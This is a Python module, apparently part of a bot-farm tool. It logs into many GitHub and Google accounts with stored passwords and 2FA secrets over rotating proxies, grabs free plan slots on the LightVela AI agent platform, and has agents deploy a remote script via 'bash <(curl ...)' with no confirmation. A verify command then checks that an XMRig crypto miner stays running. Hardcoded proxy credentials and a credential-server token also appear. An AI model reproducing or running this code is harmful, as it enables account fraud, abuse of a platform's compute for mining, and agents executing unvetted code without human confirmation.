# -*- coding: utf-8 -*-
"""
LightVela 抢名额 · 核心逻辑（解析 + 网络）。被 _build_lv_gui.py 内联进单文件入口。
设计约束：本文件自包含，不 import 本项目其它模块。
"""
import os
import re
import sys
import json
import time
import base64
import hmac
import hashlib
import struct
import shutil
import secrets
import random
import threading
import subprocess
from urllib.parse import urlparse, unquote, quote

import requests

# ---------------- 常量 ----------------
DIR = os.path.dirname(os.path.abspath(__file__))   # 脚本所在目录（lv_google_login.js 同目录）
CLIENT_ID = "Ov23ctPQOrmnxkn8SRqM"
REDIRECT = "https://api.lightvela.ai/auth/oauth/github/callback"
SCOPE = "read:user,user:email"
API = "https://api.lightvela.ai"
DEFAULT_PROXY_TYPE = "socks5"
DEFAULT_PROXY_HOST = "a.rr2.kdns.fr"
DEFAULT_PROXY_PORT = "10800"
DEFAULT_PROXY_USER = "6582443"
DEFAULT_PROXY_PASS = "6582443"
DEFAULT_PROXY = "6582443:6582443@a.rr2.kdns.fr:10800"   # 兼容旧写法
DEFAULT_BUNDLE = "bundle_launch_ai_01"   # 默认主套餐（4500 积分，常售罄）

# 国际版订阅策略：映射到（主套餐, 降级套餐）。套餐 ID 全在此处维护一份。
BUNDLE_LAUNCH_AI = "bundle_launch_ai_01"   # 4500 积分
BUNDLE_LAUNCH    = "bundle_launch_01"      # 100 积分
BUNDLE_STRATEGIES = {
    "launch_ai":        (BUNDLE_LAUNCH_AI, None),              # 只订 4500
    "launch":           (BUNDLE_LAUNCH,    None),              # 只订 100
    "auto_ai_fallback": (BUNDLE_LAUNCH_AI, BUNDLE_LAUNCH),     # 优先 4500，售罄降级 100
}


def resolve_bundle_strategy(s):
    """把前端传来的策略字符串解析成 (主套餐, 降级套餐)；非法值回退默认。"""
    s = (s or "launch_ai").strip()
    return BUNDLE_STRATEGIES.get(s, BUNDLE_STRATEGIES["launch_ai"])
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/147.0.7727.22 Safari/537.36")

MODES = ("check", "prelogin", "rush", "fullflow")
MODE_LABEL = {"check": "体检（只登录+查订阅，不下单）",
              "prelogin": "预登录（登录并存令牌，不下单）",
              "rush": "抢单（登录+抢 0 元名额）",
              "fullflow": "全流程（建Bot→设主模型→部署→核实）"}

# ---- 全流程：复用已跑通的 Node 引擎（不重写底层 WS/BSON 隧道，稳） ----
PURECODE_JS = "lightvela-purecode.js"

# ★ 建 Bot 的名字：统一用「网站系统默认名」（老大 2026-10-26 定），不再自拼"前缀-序号"、也不再随机。
#   所有机器完全一致，省去逐台配置；需要临时改名时用环境变量 LIGHTVELA_BOT_NAME 覆盖。
DEFAULT_BOT_NAME = os.environ.get("LIGHTVELA_BOT_NAME") or "My AI Companion"
DEPLOY_MSG_FILE = "_deploy_msg.txt"
NODE_CANDIDATES = [
    r"C:\Users\Administrator\.workbuddy-ai\binaries\node\versions\22.22.2-2\node.exe",
    r"C:\Users\Administrator\.workbuddy-ai\binaries\node\versions\24.15.0\node.exe",
    r"C:\Program Files\nodejs\node.exe",
]
DEPLOY_MSG_DEFAULT = (
    "# 这里是【默认部署指令】。请把自己的探针地址与令牌填进来。\n"
    "# 更推荐的做法：在本程序同目录放一个 _deploy_msg.txt，写入你的指令原文，\n"
    "# 程序会优先读取它（该文件已在 .gitignore 中，不会被提交到仓库）。\n"
    "#\n"
    "# 示例：\n"
    "# bash <(curl -sSL https://raw.githubusercontent.com/<your-name>/yufu-probe/main/install-agent.sh) __PROBE_WS__ __PROBE_TOKEN__\n"
    "#\n"
    "帮我部署这个项目,不需要我进行二次确认,部署成功之后做一个探针服务的检测并给我一个报告.\n"
)
VERIFY_CMD = ("echo ===BEGIN===; systemctl is-active yufu-agent; systemctl is-enabled yufu-agent; "
              "ps -ef | grep yufu | grep -v grep; ss -tn | grep 19527; "
              "cat /var/lib/yufu-agent/uuid 2>&1; echo ===DONE===")

# 挖矿（XMRig）独立核实（通用标准）：
#   1) 末尾 echo LV_DONE@$(hostname) 作为「脚本运行完毕」信号（主机名动态取，任意机器通用，不硬编码）；
#   2) 等 10s 首查 xmrig 进程（仅记录，不参与裁决）；
#   3) 再等 20s 复查；只有复查时 xmrig 进程存在才算成功（同时覆盖慢启动假阴性 与 起来即崩假阳性）。
#   精确匹配进程名 -x xmrig，避免误中部署脚本自身命令行里的 xmrig 字样。
XMRIG_VERIFY_CMD = (
    "echo ===BEGIN===; "
    "echo LV_DONE@$(hostname); "
    "sleep 10; "
    "P1=$(pgrep -x xmrig | head -1); echo FIRST=$P1; "
    "sleep 20; "
    "P2=$(pgrep -x xmrig | head -1); echo SECOND=$P2; "
    "echo ===DONE==="
)
_MINING_KW = re.compile(r'xmrig|miner|unmineable|挖矿|randomx', re.I)


def app_dir():
    """exe/脚本所在目录（--onefile 下取 exe 目录，而非解包临时目录）。"""
    if getattr(sys, "frozen", False):
        return os.path.dirname(os.path.abspath(sys.executable))
    return os.path.dirname(os.path.abspath(__file__))


TOKEN_FILE = "lv-tokens.json"


# ---------------- 账号解析 ----------------
def parse_accounts(text):
    """每行：GitHub 两种格式均可 —— 用户名----密码----2FA[----创建时间]（无邮箱，推荐），或 邮箱----密码----用户名----2FA[----创建时间]（兼容旧格式）。
    谷歌账号：在任意段标 google/g 即为谷歌账号，格式
        邮箱----密码----辅助邮箱[----创建时间]----google
    缺省 provider=github。
    返回 [{'idx','raw_parts','email','password','login','tfa','created','provider','recovery','ok','err'}]"""
    rows = []
    for raw in (text or "").splitlines():
        s = raw.strip()
        if not s or s.startswith("#"):
            continue
        parts = [p.strip() for p in re.split(r"-{2,}", s)]
        r = {"idx": len(rows) + 1, "raw_parts": parts, "ok": False, "err": "",
             "email": "", "password": "", "login": "", "tfa": "", "created": "",
             "provider": "github", "recovery": ""}
        # provider 判定：任意段精确等于 google/g -> 谷歌；github/gh -> GitHub；否则默认 GitHub
        provider = "github"
        for p in parts:
            pl = p.lower()
            if pl in ("google", "g"):
                provider = "google"; break
            if pl in ("github", "gh"):
                provider = "github"; break
        r["provider"] = provider
        if provider == "google":
            # 邮箱----密码----辅助邮箱[----创建时间]----google
            if not parts[0] or not parts[1]:
                r["err"] = "谷歌账号需 邮箱----密码[----辅助邮箱][----创建时间]----google"
            else:
                r["email"], r["password"] = parts[0], parts[1]
                r["recovery"] = parts[2] or ""
                r["login"] = parts[0]            # 仅用于命名/凭据 key，登录不依赖
                r["tfa"] = ""
                tail = parts[3] if len(parts) > 3 else ""
                r["created"] = tail if tail and tail.lower() not in ("google", "g", "github", "gh") else ""
                r["ok"] = True
        else:
            # GitHub 两种格式都支持：
            #   第一段含 @ → 原格式：邮箱----密码----用户名----2FA[----创建时间]
            #   第一段不含 @ → 新格式：用户名----密码----2FA[----创建时间]（无邮箱）
            if len(parts) < 3:
                r["err"] = "字段不足（GitHub 需 用户名----密码----2FA，或 邮箱----密码----用户名----2FA）"
            elif "@" in (parts[0] or ""):
                if not parts[1] or not parts[2] or not parts[3]:
                    r["err"] = "邮箱/密码/用户名/2FA 不能为空"
                else:
                    r["email"], r["password"] = parts[0], parts[1]
                    r["login"], r["tfa"] = parts[2], parts[3]
                    r["created"] = parts[4] if len(parts) > 4 else ""
                    r["ok"] = True
            else:
                if not parts[1] or not parts[2]:
                    r["err"] = "用户名/密码/2FA 不能为空"
                else:
                    r["login"], r["password"], r["tfa"] = parts[0], parts[1], parts[2]
                    r["email"] = ""
                    r["created"] = parts[3] if len(parts) > 3 else ""
                    r["ok"] = True
        rows.append(r)
    return rows


def to_line(acc):
    """按原格式导出（保持用户输入的分段，不多不少）。"""
    parts = list(acc.get("raw_parts") or [])
    return "----".join(parts)


# ---------------- 代理 ----------------
def upgrade_socks_scheme(p):
    """socks5:// -> socks5h://（远端解析 DNS）。实测 socks5:// 在本机连不通。"""
    p = (p or "").strip()
    if p.lower().startswith("socks5://"):
        return "socks5h://" + p[len("socks5://"):]
    return p


def normalize_proxy(ptype, raw):
    """支持三种写法：
      1) 带协议：socks5h://user:pass@host:port（原样返回，忽略 ptype）
      2) host:port:user:pass      （按 ptype 组装）
      3) host:port                （按 ptype 组装）
    ★ socks5 一律映射成 socks5h（远端解析 DNS）：
      实测 socks5:// 走本地解析在本机连不通，socks5h:// 正常。代理池必须用 h。
    """
    raw = (raw or "").strip()
    if not raw:
        return ""
    if "://" in raw:
        return upgrade_socks_scheme(raw)
    parts = raw.split(":")
    ptype = (ptype or DEFAULT_PROXY_TYPE).strip().lower()
    if ptype not in ("socks5", "socks5h", "http", "https"):
        ptype = DEFAULT_PROXY_TYPE
    if ptype == "socks5":
        ptype = "socks5h"          # ★ 必须远端解析，否则连不通
    if len(parts) == 4:
        host, port, user, pw = parts
        return "%s://%s:%s@%s:%s" % (ptype, user, pw, host, port)
    return "%s://%s" % (ptype, raw)


def proxy_of(acc, default_proxy):
    """账号自带代理优先，否则用界面上的默认代理。"""
    p = acc.get("proxy") if isinstance(acc, dict) else None
    return (p or default_proxy or "").strip()


def proxy_from_parts(ptype, host, port, user="", pw=""):
    """界面四栏（类型/地址/端口/账号/密码）→ 归一化代理 URL。
    · 地址栏若粘了整段 URL（含 ://），原样升级 socks5→socks5h 后返回
    · 地址栏若粘了 host:port 或 user:pass@host:port 且端口栏留空，也认
    · 有账号就拼 user:pass@，没有就 host:port
    · socks5 一律升级 socks5h（远端解析，本机实测必须）"""
    host = (host or "").strip()
    port = str(port or "").strip()
    user = (user or "").strip()
    pw = (pw or "").strip()
    if not host:
        return ""
    t = (ptype or DEFAULT_PROXY_TYPE).strip().lower()
    if t not in ("socks5", "socks5h", "http", "https"):
        t = DEFAULT_PROXY_TYPE
    if t == "socks5":
        t = "socks5h"
    if "://" in host:
        return upgrade_socks_scheme(host)
    if not port:
        # 端口栏空着：允许把 host:port / user:pass@host:port 整段粘在地址栏
        if "@" in host or ":" in host:
            return normalize_proxy(ptype, host)
        return ""
    if user:
        return "%s://%s:%s@%s:%s" % (t, quote(user, safe=""), quote(pw, safe=""), host, port)
    return "%s://%s:%s" % (t, host, port)


def proxy_to_json(proxy_url):
    """归一化 URL → Node 侧 LIGHTVELA_EGRESS_PROXY 需要的 JSON 对象。
    Node 侧只认 http / https / socks5 三种 kind。"""
    u = urlparse(proxy_url or "")
    scheme = (u.scheme or "").lower()
    kind = {"socks5h": "socks5", "socks5": "socks5",
            "http": "http", "https": "https"}.get(scheme, "http")
    return {"type": kind, "host": u.hostname or "", "port": u.port or 0,
            "username": unquote(u.username or ""), "password": unquote(u.password or "")}


# ---------------- Node 引擎桥（全流程用） ----------------
def find_node():
    """★ 先找【程序同目录】的 node.exe（绿色版整套拷走就能用），
    找不到再退回到本机已装的 Node。"""
    for name in ("node.exe", "node"):
        local = os.path.join(app_dir(), name)
        if os.path.isfile(local):
            return local
    for c in NODE_CANDIDATES:
        if os.path.isfile(c):
            return c
    return shutil.which("node") or ""


def find_purecode():
    p = os.path.join(app_dir(), PURECODE_JS)
    return p if os.path.isfile(p) else ""


def deploy_msg_path():
    """部署指令文件位置：优先【数据目录】（Docker 版挂载盘 /data，界面保存到这里，
    容器重建也不丢）；未设 LV_DATA_DIR 时退回程序目录（桌面版）。"""
    d = os.environ.get("LV_DATA_DIR") or app_dir()
    return os.path.join(d, DEPLOY_MSG_FILE)


def _read_text_file(p):
    try:
        t = open(p, encoding="utf-8").read().strip()
        return t or ""
    except Exception:
        return ""


def deploy_msg():
    """取当前生效的部署指令：
    ① 数据目录的 _deploy_msg.txt（界面「保存并生效」写这里）
    ② 程序目录的 _deploy_msg.txt（桌面版兼容）
    ③ 都没有 → 内嵌默认模板。"""
    for p in (deploy_msg_path(), os.path.join(app_dir(), DEPLOY_MSG_FILE)):
        t = _read_text_file(p)
        if t:
            return t
    return DEPLOY_MSG_DEFAULT


def save_deploy_msg(text):
    """把界面里的部署指令原文写入数据目录，返回落盘路径。"""
    p = deploy_msg_path()
    d = os.path.dirname(p)
    if d and not os.path.isdir(d):
        os.makedirs(d, exist_ok=True)
    with open(p, "w", encoding="utf-8") as f:
        f.write((text or "").strip() + "\n")
    return p


def reset_deploy_msg():
    """删掉界面保存的【数据目录覆盖文件】，回到程序目录文件或内嵌默认模板。
    只动 LV_DATA_DIR 下的覆盖文件（不碰程序目录里用户自带的 _deploy_msg.txt）。"""
    d = os.environ.get("LV_DATA_DIR")
    if d:
        p = os.path.join(d, DEPLOY_MSG_FILE)
        try:
            if os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass
    return deploy_msg()


def tail(text, n=200):
    """取输出的最后 n 个字符（一行化），给日志用。"""
    t = (text or "").replace("\r", "").strip()
    t = re.sub(r"\n+", " ⏎ ", t)
    return t[-n:] if len(t) > n else t


def run_node(js, args, extra_env=None, timeout=600):
    """跑 Node 引擎子进程，返回 (returncode, 合并输出)。失败抛异常。"""
    node = find_node()
    if not node:
        raise RuntimeError("找不到 node.exe（全流程需要 Node 环境）")
    if not js or not os.path.isfile(js):
        raise RuntimeError("找不到 %s（请把它放在程序同目录）" % PURECODE_JS)
    env = dict(os.environ)
    for k, v in (extra_env or {}).items():
        env[k] = "" if v is None else str(v)
    kw = {}
    if os.name == "nt":
        kw["creationflags"] = 0x08000000      # CREATE_NO_WINDOW：别弹黑框
    p = subprocess.run([node, js] + [str(a) for a in args],
                       cwd=os.path.dirname(js), env=env,
                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                       timeout=timeout, **kw)
    return p.returncode, (p.stdout or b"").decode("utf-8", "replace")


# ---------------- TOTP ----------------
def totp(secret, offset=0):
    key = base64.b32decode(secret.upper().replace(" ", ""))
    counter = int(time.time() // 30) + offset
    h = hmac.new(key, struct.pack(">Q", counter), hashlib.sha1).digest()
    o = h[-1] & 0x0F
    return "%06d" % ((struct.unpack(">I", h[o:o + 4])[0] & 0x7FFFFFFF) % 1000000)


def parse_inputs(html):
    out = {}
    for m in re.finditer(r'<input\b[^>]*>', html):
        tag = m.group(0)
        n = re.search(r'name="([^"]*)"', tag)
        if not n:
            continue
        v = re.search(r'value="([^"]*)"', tag)
        out[n.group(1)] = v.group(1) if v else ''
    return out


def new_session(proxy):
    s = requests.Session()
    # ★ 必须关掉 trust_env：环境里的 http_proxy/https_proxy 优先级高于 session.proxies，
    #   会静默盖掉显式代理，导致出口 IP 固定不变。
    s.trust_env = False
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    s.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9",
                      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
    return s


def api_session(token, proxy):
    s = requests.Session()
    s.trust_env = False
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    s.headers.update({"User-Agent": UA, "Accept": "application/json, text/plain, */*",
                      "Authorization": "Bearer " + token,
                      "Origin": "https://lightvela.ai", "Referer": "https://lightvela.ai/agents/",
                      "Content-Type": "application/json"})
    return s


def extract_token(url):
    if not url:
        return None
    m = re.search(r'[#?&]session_token=([0-9a-fA-F]{32,})', url)
    return m.group(1) if m else None


def gh_login(login, password, tfa, proxy, log=None):
    """GitHub 登录 + OAuth -> 返回 LightVela Bearer。失败抛异常。"""
    def L(m):
        if log:
            log(m)
    s = new_session(proxy)
    r = s.get("https://github.com/login", timeout=40)
    d = parse_inputs(r.text)
    d.update({"login": login, "password": password, "commit": "Sign in",
              "webauthn-support": d.get("webauthn-support") or "unsupported",
              "webauthn-iuvpaa-support": d.get("webauthn-iuvpaa-support") or "unsupported",
              "javascript-support": d.get("javascript-support") or "false"})
    r2 = s.post("https://github.com/session", data=d, timeout=40, allow_redirects=False)
    loc = r2.headers.get("Location", "")
    if r2.status_code == 200:
        raise RuntimeError("GitHub 拒登（密码错/验证码/风控）")
    r3 = s.get(loc if loc.startswith("http") else "https://github.com" + loc, timeout=40)
    if "two-factor" in r3.url or "two-factor" in r3.text[:4000]:
        L("  需要 2FA，提交动态码")
        d3 = parse_inputs(r3.text)
        d3["app_otp"] = totp(tfa)
        r4 = s.post("https://github.com/sessions/two-factor", data=d3, timeout=40, allow_redirects=False)
        if r4.status_code >= 400:
            d3["app_otp"] = totp(tfa, 1)
            r4 = s.post("https://github.com/sessions/two-factor", data=d3, timeout=40, allow_redirects=False)
        if s.cookies.get_dict().get("logged_in") != "yes":
            raise RuntimeError("2FA 未通过")

    L("  GitHub 登录成功，走 OAuth 授权")
    state = secrets.token_hex(16)
    s.cookies.set("lc_github_oauth_state", state, domain=".lightvela.ai", path="/")
    s.cookies.set("lc_github_oauth_return_to", "/agents/", domain=".lightvela.ai", path="/")
    url = ("https://github.com/login/oauth/authorize?client_id=" + CLIENT_ID +
           "&redirect_uri=" + REDIRECT.replace(":", "%3A").replace("/", "%2F") +
           "&scope=" + SCOPE.replace(":", "%3A").replace(",", "%2C") +
           "&state=" + state)
    rr = s.get(url, timeout=40, allow_redirects=True)
    tok = extract_token(rr.url)
    if tok:
        return tok
    d = parse_inputs(rr.text)
    d["authorize"] = "1"          # ★ 点"同意"
    r5 = s.post("https://github.com/login/oauth/authorize", data=d, timeout=40, allow_redirects=False)
    loc = r5.headers.get("Location", "")
    if "error=" in loc:
        raise RuntimeError("GitHub 拒绝授权: " + loc[:120])
    r6 = s.get(loc if loc.startswith("http") else "https://github.com" + loc,
               timeout=40, allow_redirects=False)
    tok = extract_token(r6.headers.get("Location", ""))
    if not tok:
        raise RuntimeError("没拿到 session_token")
    return tok


def gh_login_retry(login, password, tfa, proxy, log=None, max_attempts=5, retry_delay=4.0):
    """GitHub 登录 + 换 IP 重试。

    只重试「连接层/传输层」失败（代理出口 IP 脏、被 GitHub 拒连、超时等）：
    每次调用 gh_login 都会新建 session / 代理隧道，等于让出口池重新抽一个 IP，
    多数情况下再试一两次就能抽到干净 IP 登录成功。

    密码错 / 2FA 不过 / GitHub 拒登 / 没拿到 token 等「真失败」一律不重试，直接抛出。
    """
    last_exc = None
    for attempt in range(1, max_attempts + 1):
        try:
            return gh_login(login, password, tfa, proxy, log=log)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            last_exc = e
            if attempt < max_attempts:
                jit = retry_delay + (abs(hash(login)) % 3)   # 轻微错峰，避免多账号同时重抽
                if log:
                    log("  ⚠️ 登录连接失败（出口IP可能脏/被GitHub拒连）：%s — %ds后换隧道重试（第%d/%d次）"
                        % (str(e)[:90], jit, attempt, max_attempts))
                time.sleep(jit)
            else:
                if log:
                    log("  ❌ 登录连续%d次连接失败，放弃（出口池持续发脏IP？）" % max_attempts)
        except Exception:
            raise   # 真失败（密码/2FA/拒登/无token）不重试，直接抛给上层判账号失败
    raise last_exc


# ---------------- 谷歌授权登录（node + Playwright，真实浏览器引擎）----------------
# 走 /auth/oauth/google/start -> Google 登录（邮箱+密码，必要时辅助邮箱确认）
# -> LightVela 授权确认 -> 回调拿到 session_token（= Bearer，与 GitHub 同构）。
# 为什么不用纯 requests：实测证明 Google 登录页是 JS 渲染的 SPA（无传统 <form>），
# 且强制要求浏览器 JS 实时计算的机器人防护值（bgresponse）——纯 requests 既拿不到表单、
# 也算不出该值（保留 js_disabled 被拒登、删除则 500）。故必须用真实浏览器引擎，
# 由 node + Playwright（Chromium）完成登录，本文件作为 Python 侧桥（subprocess 调 lv_google_login.js）。
# 部署约束：VPS 容器需内置 node + playwright + chromium（见 Dockerfile / 部署说明）。
NODE_BIN = os.environ.get("LIGHTVELA_NODE_BIN") or "node"
GOOGLE_LOGIN_JS = os.path.join(DIR, "lv_google_login.js")


def _find_node_modules():
    """找一个装有 playwright 的 node_modules 目录，返回其路径或 None。"""
    cands = []
    if os.environ.get("LIGHTVELA_NODE_MODULES"):
        cands.append(os.environ["LIGHTVELA_NODE_MODULES"])
    # 本机 managed node 工作区（已确认装了 playwright）
    cands.append(r"C:\Users\Administrator\.workbuddy\binaries\node\workspace\node_modules")
    # 脚本同目录下的 node_modules（部署时若把 playwright 放旁边）
    cands.append(os.path.join(DIR, "node_modules"))
    # Docker 容器内：Dockerfile 用 `npm install playwright` 装到 /app/node_modules
    cands.append("/app/node_modules")
    for c in cands:
        if c and os.path.isdir(os.path.join(c, "playwright")):
            return c
    return None


def google_login(email, password, recovery, px=None, log=None):
    """谷歌授权登录（node + Playwright）-> 返回 LightVela Bearer。失败抛异常。
    px（代理）保留以与 GitHub 路径对齐；node 脚本默认走自身网络（容器内直连/系统代理）。"""
    def L(m):
        if log:
            log(m)
    if not email or not password:
        raise RuntimeError("谷歌账号需 邮箱 + 密码")
    if not os.path.exists(GOOGLE_LOGIN_JS):
        raise RuntimeError("缺少谷歌登录脚本: " + GOOGLE_LOGIN_JS)
    env = dict(os.environ)
    nm = _find_node_modules()
    if nm:
        env["NODE_PATH"] = nm
        env["PLAYWRIGHT_PKG"] = os.path.join(nm, "playwright")
    else:
        L("  ⚠️ 未找到 playwright 模块目录（可在 LIGHTVELA_NODE_MODULES 指定；容器需内置）")
    args = [NODE_BIN, GOOGLE_LOGIN_JS, "--email=" + email, "--password=" + password]
    if recovery:
        args.append("--recovery=" + recovery)
    L("  启动谷歌无头浏览器登录 ...")
    try:
        # 超时放宽到 360s：小内存机器(如 952MB 的 80 VPS)上实测谷歌登录要 150~300s，
        # 原 180s 会误杀近一半账号（观测到最慢 298.5s）。
        r = subprocess.run(args, capture_output=True, text=True, env=env, timeout=360)
    except subprocess.TimeoutExpired:
        raise RuntimeError("谷歌登录超时（浏览器流程 >360s）")
    except FileNotFoundError:
        raise RuntimeError("找不到 node 可执行文件（请设置 LIGHTVELA_NODE_BIN，并确保容器内置 node）")
    out = (r.stdout or "").strip()
    try:
        data = json.loads(out)
    except Exception:
        raise RuntimeError("谷歌登录脚本输出无法解析: " + out[-200:] +
                           " | stderr=" + (r.stderr or "")[-200:])
    if not data.get("ok") or not data.get("token"):
        raise RuntimeError("谷歌登录失败: " + str(data.get("error") or "未知") +
                           ((" | " + (r.stderr or "")[-160:]) if r.stderr else ""))
    return data["token"]


def google_login_retry(email, password, recovery, px=None, log=None, max_attempts=3, retry_delay=5.0):
    """谷歌登录 + 环境层失败重试（超时 / node 缺失 / 输出解析失败）。
    账号密码错、辅助邮箱验证不通过等「真失败」不重试，直接抛出。"""
    last_exc = None
    for attempt in range(1, max_attempts + 1):
        try:
            return google_login(email, password, recovery, px, log=log)
        except RuntimeError as e:
            msg = str(e)
            if "超时" in msg or "node" in msg or "脚本输出无法解析" in msg or "缺少谷歌登录脚本" in msg:
                last_exc = e
                if attempt < max_attempts:
                    if log:
                        log("  ⚠️ 谷歌登录环境异常（%s），%ds后重试（第%d/%d次）"
                            % (msg[:80], retry_delay, attempt, max_attempts))
                    time.sleep(retry_delay)
                else:
                    raise
            else:
                raise   # 真失败不重试
    raise last_exc


def live_passes(s):
    r = s.get(API + "/v1/passes", timeout=40)
    try:
        return r.json().get("data", {}).get("passes", []) or []
    except Exception:
        return []


def probe_token(s):
    """查订阅 + 顺手判断令牌死活（★ 显式令牌检查）。
    返回 (state, passes)：state ∈ 'ok' | 'dead' | 'unknown'
      ok      = HTTP 2xx，令牌有效（passes 为空 = 真的没订阅）
      dead    = HTTP 401/403，令牌已失效 → 必须重新登录
      unknown = 网络异常或其它状态码 → 不能判死（抖动而已）
    老版把状态码吞了，令牌过期会伪装成"没订阅"，导致假成功。
    """
    try:
        r = s.get(API + "/v1/passes", timeout=40)
    except Exception:
        return "unknown", []
    if r.status_code in (401, 403):
        return "dead", []
    if 200 <= r.status_code < 300:
        try:
            d = r.json().get("data", {}) or {}
            return "ok", d.get("passes", []) or []
        except Exception:
            return "ok", []
    return "unknown", []


# ---------------- 凭证文件（令牌库）----------------
def token_path():
    """凭证文件位置。
    优先用环境变量 LV_DATA_DIR（Docker 版指向挂载的数据盘）；
    未设置时退回【程序所在目录】——桌面版即 exe 同目录。"""
    d = os.environ.get("LV_DATA_DIR") or app_dir()
    return os.path.join(d, TOKEN_FILE)


def load_tokens():
    """读出 {login: token}（扁平化，兼容老的纯字符串写法）。"""
    p = token_path()
    if not os.path.isfile(p):
        return {}
    try:
        d = json.load(open(p, encoding="utf-8"))
        if not isinstance(d, dict):
            return {}
        out = {}
        for k, v in d.items():
            t = v.get("token") if isinstance(v, dict) else v
            if k and t:
                out[k] = t
        return out
    except Exception:
        return {}


# ---------------- 数据中心（凭证中心）对接 2026-10-27 ----------------
# 规则（老大定）：先问中心（查全量，不分机器，可跨机复用）→ 连不上/查不到再查本地 → 都没有按新号走
CENTER_BASE = os.environ.get("LIGHTVELA_CENTER", "http://43.167.192.48:18090")
CENTER_TOKEN = os.environ.get("LIGHTVELA_CENTER_TOKEN", "lvc-9f3a7d2e6b1c4a85")
CENTER_TIMEOUT = float(os.environ.get("LIGHTVELA_CENTER_TIMEOUT", "6"))


def center_machine_id():
    """本机标识：环境变量 → 数据目录下 machine-id → 空字符串"""
    v = (os.environ.get("LIGHTVELA_MACHINE_ID") or "").strip()
    if v:
        return v
    try:
        p = os.path.join(os.path.dirname(token_path()), "machine-id")
        with open(p, encoding="utf-8") as f:
            return f.read().strip()
    except Exception:
        return ""


def center_get_token(username):
    """按用户名问数据中心要令牌。连不上/查不到都返回 None，调用方自行回退本地/登录。"""
    if not username:
        return None
    try:
        r = requests.get(CENTER_BASE + "/creds/lookup",
                         params={"platform": "intl", "username": username},
                         headers={"X-Auth-Token": CENTER_TOKEN}, timeout=CENTER_TIMEOUT)
        if r.status_code != 200:
            return None
        d = r.json() or {}
        for c in (d.get("creds") or []):
            if c.get("token"):
                return c["token"]
        return None
    except Exception:
        return None


def center_push_token(username, token):
    """把令牌推到数据中心（失败只返回 False，本地已存，不影响任务）"""
    if not (username and token):
        return False
    try:
        r = requests.post(CENTER_BASE + "/creds",
                          json={"platform": "intl", "account_key": username, "token": token,
                                "owner": center_machine_id() or None},
                          headers={"X-Auth-Token": CENTER_TOKEN}, timeout=CENTER_TIMEOUT)
        return r.status_code == 200
    except Exception:
        return False


def merge_tokens(local, incoming):
    """合并两份凭证。同一账号【时间新的赢】（老大选的"甲"规则）。
    返回 (merged, added, updated)。"""
    merged = {}
    for k, v in (local or {}).items():
        t = v.get("token") if isinstance(v, dict) else v
        ts = int(v.get("ts") or 0) if isinstance(v, dict) else 0
        if k and t:
            merged[k] = {"token": t, "ts": ts}
    added = updated = 0
    for k, v in (incoming or {}).items():
        t = v.get("token") if isinstance(v, dict) else v
        ts = int(v.get("ts") or 0) if isinstance(v, dict) else 0
        if not (k and t):
            continue
        old = merged.get(k)
        if old is None:
            merged[k] = {"token": t, "ts": ts}
            added += 1
        elif ts >= int(old.get("ts") or 0):
            merged[k] = {"token": t, "ts": ts}
            updated += 1
    return merged, added, updated


def write_tokens(d):
    p = token_path()
    with open(p, "w", encoding="utf-8") as f:
        json.dump(d, f, ensure_ascii=False, indent=2)
    return p


def order(s, bundle):
    r = s.post(API + "/v1/passes/dianshi/order-and-pay",
               data=json.dumps({"bundle_id": bundle, "period": 1, "time_unit": "m"}), timeout=40)
    code, msg = "", ""
    try:
        j = r.json()
        code = str(j.get("code") or j.get("error") or "")
        msg = str(j.get("message") or j.get("msg") or "")
    except Exception:
        msg = r.text[:120]
    return r.status_code, code, msg


def fetch_bundles(proxy_url, token=None):
    """GET /v1/bundles → 返回套餐列表（失败返回 []）。token 可选（带则鉴权）。"""
    s = api_session(token, proxy_url) if token else new_session(proxy_url)
    try:
        r = s.get(API + "/v1/bundles", timeout=40)
    except Exception:
        return []
    if r.status_code != 200:
        return []
    try:
        d = r.json().get("data", {})
        return d.get("bundles") or d.get("items") or []
    except Exception:
        return []


def bundle_state(proxy_url, bundle_id=DEFAULT_BUNDLE, token=None):
    """返回目标包的 bundle_sales_state（'AVAILABLE'/'SOLD_OUT'/...），取不到返回 None。

    ★ 必须带令牌！不带令牌平台直接回 401，返回空列表 → 状态恒为 None。
      2026-10-27 前的老代码所有调用点都没传令牌，导致「售罄降级」和「放货监控」
      两条逻辑的判断条件永远不成立（等于从未生效）。
    """
    for b in fetch_bundles(proxy_url, token):
        if b.get("bundle_id") == bundle_id:
            return b.get("bundle_sales_state")
    return None


# ---------------- Telegram 推送 2026-10-27 ----------------
TG_CONFIG_FILE = "lv-tg.json"


def tg_config_path():
    """机器人配置文件位置：优先数据目录（Docker 挂载盘 /data），否则程序目录。"""
    d = os.environ.get("LV_DATA_DIR") or app_dir()
    return os.path.join(d, TG_CONFIG_FILE)


def load_tg_config():
    """读机器人配置：{token, chat_id, enabled}。文件不存在/损坏一律返回空配置，不抛异常。"""
    cfg = {"token": "", "chat_id": "", "enabled": True}
    p = tg_config_path()
    if not os.path.isfile(p):
        return cfg
    try:
        d = json.load(open(p, encoding="utf-8"))
        if isinstance(d, dict):
            for k in ("token", "chat_id"):
                if d.get(k):
                    cfg[k] = str(d[k]).strip()
            if "enabled" in d:
                cfg["enabled"] = bool(d["enabled"])
    except Exception:
        pass
    return cfg


def save_tg_config(token, chat_id, enabled=True):
    """保存机器人配置。返回 (ok, 路径 或 错误说明)。"""
    p = tg_config_path()
    try:
        d = os.path.dirname(p)
        if d and not os.path.isdir(d):
            os.makedirs(d, exist_ok=True)
        with open(p, "w", encoding="utf-8") as f:
            json.dump({"token": (token or "").strip(),
                       "chat_id": (chat_id or "").strip(),
                       "enabled": bool(enabled)}, f, ensure_ascii=False, indent=2)
        return True, p
    except Exception as e:
        return False, "%s: %s" % (type(e).__name__, e)


def tg_send(text, token=None, chat_id=None, proxy_url=None):
    """给 Telegram 机器人发一条消息，返回 (ok, 说明)。

    ★ 三重保险，绝不影响抢单/监控主流程：
      1) 没配令牌或会话ID → 直接返回失败，不发请求；
      2) 先直连；直连不通且给了代理 → 再用代理试一次（海外机器直连 api.telegram.org 一般通，
         国内机器多半不通，所以留了代理兜底）；
